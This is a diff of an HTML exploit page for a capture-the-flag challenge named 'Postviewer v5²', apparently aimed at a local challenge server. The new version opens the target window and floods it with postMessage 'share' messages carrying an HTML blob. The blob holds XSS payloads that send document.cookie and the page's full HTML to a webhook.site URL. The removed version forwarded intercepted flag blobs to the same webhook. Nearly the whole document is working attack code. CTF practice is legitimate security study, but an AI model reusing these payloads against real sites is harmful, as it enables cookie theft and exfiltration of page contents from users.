@@ -2,76 +2,53 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Postviewer v5² Exploit</title>
+  <title>Postviewer v5² SafeFrame Race Exploit (Fixed)</title>
 </head>
 <body>
-  <h1>Postviewer v5² Exploit Running…</h1>
-  <p>Waiting for message…</p>
+  <h1>Running SafeFrame Hijack…</h1>
+  <p>Check your webhook for hits!</p>
 
   <script>
-    const WEBHOOK = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032'; // put your real one here
+    const WEBHOOK = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032'; // CHANGE THIS!
 
-    console.log('[+] Exploit loaded');
+    // Open challenge page
+    const victim = window.open('http://localhost:1338', '_blank');
 
-    // 1. Setup message listener
-    window.addEventListener('message', async (e) => {
-      console.log('[+] Got message:', e.data);
+    if (!victim) {
+      console.error('Failed to open victim window. Enable popups.');
+    }
 
-      // Is this the share message with the flag?
-      if (e.data && e.data.type === 'share') {
-        console.log('[+] Got share message:', e.data);
-
-        // Attempt to read the blob
-        const file = e.data.files?.[0];
-        if (file && file.blob) {
-          console.log('[+] Reading blob…');
-          try {
-            const blob = new Blob([file.blob]);
-            const text = await blob.text();
-            console.log('[+] Blob text:', text);
-
-            await fetch(WEBHOOK, {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ flag: text, raw: e.data })
-            });
-
-          } catch (err) {
-            console.error('[!] Failed to read blob:', err);
-            await fetch(WEBHOOK, {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({ error: err.toString(), raw: e.data })
-            });
-          }
-        } else {
-          console.log('[!] Got message but no blob!');
-          await fetch(WEBHOOK, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ error: 'No blob', raw: e.data })
-          });
-        }
-
-      } else {
-        console.log('[+] Got other message, forwarding anyway.');
-        await fetch(WEBHOOK, {
+    // Start race to overwrite the flag file
+    const spamInterval = setInterval(() => {
+      // Safe: no nested <script> in template literal!
+      const payload = `
+        <img src='${WEBHOOK}?img='+document.cookie />
+        <script>fetch('${WEBHOOK}', {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ msg: e.data })
-        });
-      }
-    });
+          body: document.documentElement.innerHTML
+        })<\/script>
+      `;
 
-    // 2. Create iframe that loads the challenge page
-    const iframe = document.createElement('iframe');
-    iframe.src = 'http://localhost:1338'; // 🏴‍☠️ Replace with challenge URL if different
-    iframe.width = 800;
-    iframe.height = 600;
-    document.body.appendChild(iframe);
+      const blob = new Blob([payload], { type: "text/html" });
 
-    console.log('[+] Iframe added');
+      victim.postMessage({
+        type: "share",
+        files: [{
+          blob: blob,
+          cached: false,
+          name: "evilfile.txt"
+        }]
+      }, '*');
+
+      console.log('[+] Sent malicious file');
+
+    }, 20);
+
+    setTimeout(() => {
+      clearInterval(spamInterval);
+      console.log('[+] Stopped spamming.');
+    }, 10000);
+
   </script>
 </body>
 </html>
-    
